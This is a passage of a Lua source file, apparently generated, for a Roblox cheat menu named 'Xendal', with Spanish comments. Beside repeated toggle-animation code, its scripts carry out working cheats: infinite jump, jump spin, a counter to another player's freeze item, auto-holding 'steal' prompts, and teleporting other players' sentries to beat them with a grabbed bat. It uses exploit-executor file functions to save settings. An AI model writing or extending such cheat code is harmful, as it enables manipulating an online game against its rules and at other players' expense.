			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_155);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Holder.Button.LocalScript
local function C_15c()
local script = G2L["15c"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	
	local player = Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local root = character:WaitForChild("HumanoidRootPart")
	
	local button = script.Parent
	local isEnabled = false
	
	local OFF_COLOR = Color3.fromRGB(255,255,255)
	local ON_COLOR = Color3.fromRGB(70,130,180)
	
	local spinningSpeed = 10 -- Velocidad del giro
	
	local spinConnection
	
	-- Función de giro
	local function onUpdate()
		if humanoid:GetState() == Enum.HumanoidStateType.Jumping 
			or humanoid:GetState() == Enum.HumanoidStateType.Freefall then
			root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(spinningSpeed), 0)
		end
	end
	
	local function activate()
		spinConnection = RunService.Heartbeat:Connect(onUpdate)
	end
	
	local function deactivate()
		if spinConnection then
			spinConnection:Disconnect()
			spinConnection = nil
		end
	end
	
	local function toggle()
		if isEnabled then
			deactivate()
			button.TextColor3 = OFF_COLOR
		else
			activate()
			button.TextColor3 = ON_COLOR
		end
		isEnabled = not isEnabled
	end
	
	-- Estado inicial apagado
	button.TextColor3 = OFF_COLOR
	
	button.MouseButton1Click:Connect(toggle)
	
end;
task.spawn(C_15c);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Main Handler
local function C_160()
local script = G2L["160"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_160);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Holder.Button.LocalScript
local function C_167()
local script = G2L["167"];
	local Player = game:GetService('Players').LocalPlayer
	local UIS = game:GetService('UserInputService')
	local button = script.Parent  -- Asume que este script está dentro de un TextButton
	
	-- Configuración del JumpHeight
	_G.JumpHeight = 50
	
	-- Variable para controlar si el salto infinito está habilitado
	local isEnabled = false
	
	-- Función auxiliar
	local function Action(Object, Function)
		if Object ~= nil then
			Function(Object)
		end
	end
	
	-- Función para actualizar el color del botón
	local function updateButtonAppearance()
		if isEnabled then
			button.TextColor3 = Color3.fromRGB(70, 130, 180)  -- Verde cuando está activado
		else
			button.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco cuando está desactivado
		end
	end
	
	-- Detectar la pulsación de la tecla espacio
	UIS.InputBegan:Connect(function(UserInput)
		if isEnabled and UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
			Action(Player.Character.Humanoid, function(self)
				if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
					Action(self.Parent.HumanoidRootPart, function(self)
						self.Velocity = Vector3.new(0, _G.JumpHeight, 0)
					end)
				end
			end)
		end
	end)
	
	-- Función Toggle para activar/desactivar el Infinity Jump
	local function toggleInfinityJump()
		isEnabled = not isEnabled
		updateButtonAppearance()
	end
	
	-- Conectar el evento del botón
	button.MouseButton1Click:Connect(toggleInfinityJump)
	
	-- Actualizar el color del botón al inicio
	updateButtonAppearance()
	
end;
task.spawn(C_167);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Main Handler
local function C_16b()
local script = G2L["16b"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_16b);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Holder.Button.LocalScript
local function C_172()
local script = G2L["172"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	
	local player = Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local root = character:WaitForChild("HumanoidRootPart")
	
	-- Configuración
	local STILL_DELAY_MIN = 1.7  -- El jugador debe estar quieto al menos 1.7 segundos
	local FREEZE_DURATION = 2.6  -- Congelación por 2.4 segundos (ajustable)
	
	-- Estado
	local lastPos = root.Position
	local stillTime = 0
	local isFrozen = false
	local recentMedusaAction = false  -- Detectar si la Medusa fue equipada o desequipada
	local freezeStartTime = nil  -- Guarda el tiempo de inicio del congelamiento
	local medusaActionTime = nil  -- Guarda el tiempo en el que la Medusa fue equipada/desequipada
	local scriptActivated = false  -- Control para saber si el script está activado o no
	
	-- TextButton (puede ser reemplazado por TextBox si quieres)
	local button = script.Parent
	if not button:IsA("TextButton") then button = nil end
	
	-- ================== SISTEMA DE GUARDADO ==================
	local baseFolder = "Xendal"
	local filePath = baseFolder .. "/" .. player.Name .. "_freezeScript.json"
	
	-- Crear carpeta si no existe
	pcall(function()
		if makefolder and not isfolder(baseFolder) then
			makefolder(baseFolder)
		end
	end)
	
	-- Cargar configuración
	local function loadConfig()
		local data
		pcall(function()
			if isfile and isfile(filePath) then
				local raw = readfile(filePath)
				data = HttpService:JSONDecode(raw)
			end
		end)
		if data and type(data) == "table" then
			return data
		end
		return { scriptActivated = false, buttonColor = {255, 255, 255} }
	end
	
	-- Guardar configuración
	local function saveConfig()
		local config = {
			scriptActivated = scriptActivated,
			buttonColor = {button.TextColor3.R * 255, button.TextColor3.G * 255, button.TextColor3.B * 255}
		}
		pcall(function()
			if writefile then
				writefile(filePath, HttpService:JSONEncode(config))
			end
		end)
	end
	
	-- Cargar estado desde el archivo
	local config = loadConfig()
	scriptActivated = config.scriptActivated
	button.TextColor3 = Color3.fromRGB(unpack(config.buttonColor))
	
	-- ================== SISTEMA DE GUARDADO ==================
	
	-- Congelar al personaje
	local function setFreeze(state)
		if state then
			isFrozen = true
			root.Anchored = true  -- Congelar al humanoide
			humanoid.WalkSpeed = 0  -- No puede moverse
			freezeStartTime = tick()  -- Registrar el tiempo de inicio del congelamiento
		else
			isFrozen = false
			root.Anchored = false  -- Descongelar al humanoide
			humanoid.WalkSpeed = 16  -- Restaurar velocidad de caminata
		end
	end
	
	-- Activar congelación inmediatamente
	local function activateFreeze()
		if isFrozen then return end
		setFreeze(true)
		-- Congelar por la duración definida
		task.wait(FREEZE_DURATION)
		setFreeze(false)
	end
	
	-- Detectar Medusa en otros jugadores
	local function bindCharacterToolEvents(plr, character)
		if not character then return end
	
		-- Revisa si el personaje tiene Medusa's Head
		character.ChildAdded:Connect(function(child)
			if child:IsA("Tool") and child.Name == "Medusa's Head" then
				medusaActionTime = tick()  -- Registrar el tiempo exacto en que se equipó la Medusa
				recentMedusaAction = true
			end
		end)
	
		-- Detectar cuando se desequipa "Medusa's Head"
		character.ChildRemoved:Connect(function(child)
			if child:IsA("Tool") and child.Name == "Medusa's Head" then
				medusaActionTime = tick()  -- Registrar el tiempo exacto en que se desequipó la Medusa
				recentMedusaAction = true
			end
		end)
	end
	
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= player then
			if plr.Character then
				bindCharacterToolEvents(plr, plr.Character)
			end
			plr.CharacterAdded:Connect(function(c)
				bindCharacterToolEvents(plr, c)
			end)
		end
	end
	
	Players.PlayerAdded:Connect(function(plr)
		if plr ~= player then
			plr.CharacterAdded:Connect(function(c)
				bindCharacterToolEvents(plr, c)
			end)
		end
	end)
	
	-- Loop principal para revisar el tiempo de congelación
	RunService.Heartbeat:Connect(function(dt)
		-- Solo ejecutar si el script está activado
		if not scriptActivated then
			return
		end
	
		local distance = (root.Position - lastPos).Magnitude
	
		-- Solo acumula el tiempo de quietud si el jugador está quieto
		if distance < 0.1 then
			stillTime = stillTime + dt
		else
			stillTime = 0  -- Resetear el tiempo si el jugador se mueve
		end
	
		lastPos = root.Position
	
		-- Si el jugador está quieto dentro del rango de tiempo y alguien usa Medusa's Head
		if stillTime >= STILL_DELAY_MIN and recentMedusaAction and not isFrozen then
			-- Comprobar si el tiempo de la acción de Medusa coincide con el tiempo actual
			if medusaActionTime and (tick() - medusaActionTime) < 1 then
				-- Si la acción de Medusa ocurrió dentro de 1 segundo de que el jugador estuvo quieto
				activateFreeze()
			end
			recentMedusaAction = false  -- Resetear el estado de Medusa después de congelar
		end
	
		-- Desactivar el freeze después de que pase el tiempo de congelación
		if isFrozen and tick() - freezeStartTime >= FREEZE_DURATION then
			setFreeze(false)
		end
	end)
	
	-- Activar o desactivar el script con el botón de toggle
	local function toggleScript()
		if scriptActivated then
			scriptActivated = false
			button.TextColor3 = Color3.fromRGB(255,255,255)  -- Cambiar color de texto a blanco cuando se desactiva
		else
			scriptActivated = true
			button.TextColor3 = Color3.fromRGB(70,130,180)  -- Cambiar color de texto a azul cuando se activa
		end
	
		-- Guardar estado al cambiar
		saveConfig()
	end
	
	-- Conectar el botón de toggle
	if button then
		button.MouseButton1Click:Connect(toggleScript)
	end
	
end;
task.spawn(C_172);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Main Handler
local function C_176()
local script = G2L["176"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_176);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Holder.Button.LocalScript
local function C_17d()
local script = G2L["17d"];
	local player = game.Players.LocalPlayer
	local btn = script.Parent
	
	local sentryEnabled = false
	local sentryConn = nil
	
	local MY_SENTRY = "Sentry_1759418497"
	
	-- evitar doble proceso por sentry
	local alreadyProcessing = {}
	
	-------------------------------------------------------------
	-- FUNCION PARA TPEAR SENTRY Y VALIDAR
	-------------------------------------------------------------
	local function tpSentry(desc, hrp)
		local targetCF = hrp.CFrame + hrp.CFrame.LookVector * 4.5 + Vector3.new(0, 1.2, 0)
	
		if desc:IsA("Model") and desc.PrimaryPart then
			desc:SetPrimaryPartCFrame(targetCF)
		elseif desc:IsA("BasePart") then
			desc.CFrame = targetCF
		end
	
		task.wait(0.05)
	
		local currentPos
		if desc:IsA("Model") and desc.PrimaryPart then
			currentPos = desc.PrimaryPart.Position
		else
			currentPos = desc.Position
		end
	
		local targetPos = targetCF.Position
		return (currentPos - targetPos).Magnitude < 3
	end
	
	-------------------------------------------------------------
	-- PROCESAR UNA SENTRY (TP CONSTANTE)
	-------------------------------------------------------------
	local function processSentry(desc)
		if desc.Name == MY_SENTRY then return end
		if alreadyProcessing[desc] then return end
	
		alreadyProcessing[desc] = true
	
		task.wait(4.1)
		if not sentryEnabled or not desc.Parent then 
			alreadyProcessing[desc] = nil
			return 
		end
	
		local char = player.Character
		if not char then 
			alreadyProcessing[desc] = nil
			return 
		end
	
		local hrp = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hrp or not hum then 
			alreadyProcessing[desc] = nil
			return 
		end
	
		-----------------------------------------------------------------
		-- 1. QUIERO TPEARLA CONSTANTEMENTE, haya o no bat
		-----------------------------------------------------------------
		task.spawn(function()
			while sentryEnabled and desc.Parent do
				tpSentry(desc, hrp)
				task.wait(0.1)
			end
		end)
	
		-----------------------------------------------------------------
		-- 2. Solo conseguimos bat si el primer TP fue exitoso
		-----------------------------------------------------------------
		if not tpSentry(desc, hrp) then
			alreadyProcessing[desc] = nil
			return
		end
	
		-- conseguir bat
		local backpack = player.Backpack
		local bat = backpack:FindFirstChild("Bat") or char:FindFirstChild("Bat")
	
		if not bat then
			for _, obj in ipairs(workspace:GetDescendants()) do
				if obj:IsA("Tool") and obj.Name == "Bat" and obj.Parent == workspace then
					obj.Parent = backpack
					bat = obj
					break
				end
			end
		end
	
		if not bat then 
			alreadyProcessing[desc] = nil
			return 
		end
	
		-- equipar
		if bat.Parent == backpack then
			hum:EquipTool(bat)
			task.wait(0.1)
		end
	
		-----------------------------------------------------------------
		-- 3. Golpes mientras exista la sentry
		-----------------------------------------------------------------
		while sentryEnabled and desc.Parent and bat.Parent == char do
			bat:Activate()
			task.wait(0.1)
		end
	
		-- guardar bat
		if bat.Parent == char then
			bat.Parent = backpack
		end
	
		alreadyProcessing[desc] = nil
	end
	
	-------------------------------------------------------------
	-- DETECTAR SENTRY
	-------------------------------------------------------------
	local function startSentryWatch()
		if sentryConn then 
			sentryConn:Disconnect()
		end
	
		sentryConn = workspace.DescendantAdded:Connect(function(desc)
			if not sentryEnabled then return end
			if not (desc:IsA("Model") or desc:IsA("BasePart")) then return end
			if not string.find(desc.Name:lower(), "sentry") then return end
			if desc.Name == MY_SENTRY then return end
	
			task.spawn(function()
				processSentry(desc)
			end)
		end)
	end
	
	local function stopSentryWatch()
		if sentryConn then
			sentryConn:Disconnect()
			sentryConn = nil
		end
	end
	
	-------------------------------------------------------------
	-- BOTÓN
	-------------------------------------------------------------
	btn.MouseButton1Click:Connect(function()
		sentryEnabled = not sentryEnabled
		if sentryEnabled then
			startSentryWatch()
		else
			stopSentryWatch()
		end
	end)
	
end;
task.spawn(C_17d);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Main Handler
local function C_181()
local script = G2L["181"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_181);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Holder.Button.LocalScript
local function C_188()
local script = G2L["188"];
	local toggleButton = script.Parent -- El botón que cambiará la visibilidad
	local screenGui = game.Players.LocalPlayer.PlayerGui:WaitForChild("Xendal") -- Especifica el ScreenGui
	local fpsFrame = screenGui:WaitForChild("XendalAimlock") -- Busca el Frame llamado FpsSwihz en el ScreenGui
	
	local isVisible = false -- Controla el estado de la visibilidad
	
	-- Asegurarse de que el Frame esté oculto al inicio
	fpsFrame.Visible = isVisible -- Esto lo inicializa en invisible
	
	-- Función para alternar la visibilidad del Frame
	local function toggleVisibility()
		isVisible = not isVisible
		fpsFrame.Visible = isVisible -- Cambia la visibilidad
	
		-- Cambiar el color del botón basado en la visibilidad
		if isVisible then
			toggleButton.TextColor3 = Color3.fromRGB(70,130,180)  -- Verde si está visible
		else
			toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco si está oculto
		end
	end
	
	-- Conectar el botón al toggle de visibilidad
	toggleButton.MouseButton1Click:Connect(toggleVisibility)
	
end;
task.spawn(C_188);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Main Handler
local function C_18c()
local script = G2L["18c"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_18c);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrabToggle.Holder.Button.LocalScript
local function C_193()
local script = G2L["193"];
	local Players = game:GetService("Players")
	local ProximityPromptService = game:GetService("ProximityPromptService")
	local LocalPlayer = Players.LocalPlayer
	
	--= STEAL SYSTEM =--
	local currentPrompt = nil
	local holding = false
	local button = script.Parent  -- Suponemos que este script está dentro de un TextButton
	
	-- Función para verificar si el prompt es de "steal"
	local function esSteal(prompt)
		local texto = string.lower(prompt.ActionText or "")
		return string.find(texto, "steal") ~= nil
	end
	
	-- Bucle que mantiene presionado el prompt
	task.spawn(function()
		while true do
			task.wait(0.05)
			if holding and currentPrompt then
				currentPrompt:InputHoldBegin()
			end
		end
	end)
	
	-- Prompt aparece
	ProximityPromptService.PromptShown:Connect(function(prompt)
		if not esSteal(prompt) then return end
		if not holding then return end  -- Solo si el toggle está ON
		currentPrompt = prompt
	end)
	
	-- Prompt desaparece
	ProximityPromptService.PromptHidden:Connect(function(prompt)
		if prompt == currentPrompt then
			currentPrompt = nil
		end
	end)
	
	-- Toggle para activar/desactivar el Steal
	local isEnabled = false  -- Estado del toggle
	
	-- Función para actualizar el color del botón
	local function updateButtonAppearance()
		if isEnabled then
			button.TextColor3 = Color3.fromRGB(70,130,180)  -- Verde cuando está activado
		else
			button.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco cuando está desactivado
		end
	end
	
	-- Función para activar Steal
	local function startSteal()
		holding = true
		updateButtonAppearance()  -- Actualiza el color del botón
	end
	
	-- Función para desactivar Steal
	local function stopSteal()
		holding = false
		currentPrompt = nil
		updateButtonAppearance()  -- Actualiza el color del botón
	end
	
	-- Evento del botón para alternar el toggle
	button.MouseButton1Click:Connect(function()
		isEnabled = not isEnabled  -- Alternar el estado del toggle
	
		if isEnabled then
			startSteal()
		else
			stopSteal()
		end
	end)
	
	-- Actualizar el color del botón al inicio
	updateButtonAppearance()
	
end;
task.spawn(C_193);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Main Handler
local function C_197()
local script = G2L["197"];
	local TweenService = game:GetService("TweenService")
	
	local Holder = script.Parent:WaitForChild("Holder")
	local Circle = Holder:WaitForChild("Circle")
	local Mini = Circle:WaitForChild("Mini")
	
	local Button = Holder:WaitForChild("Button")
	
	local function setToggle(request)
		local Duration = 0.25
		local Style = Enum.EasingStyle.Sine
		local Direction = Enum.EasingDirection.Out
		local RepeatCount = 0
		local Reverse = false
		local TweenDelay = 0
		local AnimateInfo = TweenInfo.new(Duration, Style, Direction, RepeatCount, Reverse, TweenDelay)
	
		if request == true then
			local Holder_Open = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Open = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(1, 0, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5)})
			local Mini_Open = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
	
			Holder_Open:Play()
			Circle_Open:Play()
			Mini_Open:Play()
		elseif request == false then
			local Holder_Close = TweenService:Create(Holder, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
			local Circle_Close = TweenService:Create(Circle, AnimateInfo, {Position = UDim2.new(0, 0, 0.5, 0), AnchorPoint = Vector2.new(0, 0.5)})
			local Mini_Close = TweenService:Create(Mini, AnimateInfo, {BackgroundColor3 = Color3.new(0.235294, 0.235294, 0.235294)})
	
			Holder_Close:Play()
			Circle_Close:Play()
			Mini_Close:Play()
		else
			warn("")
		end
	end
	
	
	local Cooldown = false
	local isOpen = false
	Button.MouseButton1Click:Connect(function()
		if not Cooldown then
			Cooldown = true
	
			if not isOpen then
				setToggle(true)
	
				isOpen = true
			else
				setToggle(false)
	
				isOpen = false
			end
	
			wait(0) 
			Cooldown = false
		end
	end)
end;
task.spawn(C_197);
-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrabToggle.Holder.Button.LocalScript
local function C_19e()
local script = G2L["19e"];
	local toggleButton = script.Parent -- El botón que cambiará la visibilidad
	local screenGui = game.Players.LocalPlayer.PlayerGui:WaitForChild("Xendal") -- Especifica el ScreenGui
	local fpsFrame = screenGui:WaitForChild("XendalInstaGrab") -- Busca el Frame llamado FpsSwihz en el ScreenGui
	
	local isVisible = false -- Controla el estado de la visibilidad
	
	-- Asegurarse de que el Frame esté oculto al inicio
	fpsFrame.Visible = isVisible -- Esto lo inicializa en invisible
	
	-- Función para alternar la visibilidad del Frame
	local function toggleVisibility()
		isVisible = not isVisible
		fpsFrame.Visible = isVisible -- Cambia la visibilidad
	
		-- Cambiar el color del botón basado en la visibilidad
		if isVisible then
			toggleButton.TextColor3 = Color3.fromRGB(70,130,180)  -- Verde si está visible
		else
			toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Blanco si está oculto
		end
	end
	
	-- Conectar el botón al toggle de visibilidad
	toggleButton.MouseButton1Click:Connect(toggleVisibility)
	
end;
task.spawn(C_19e);
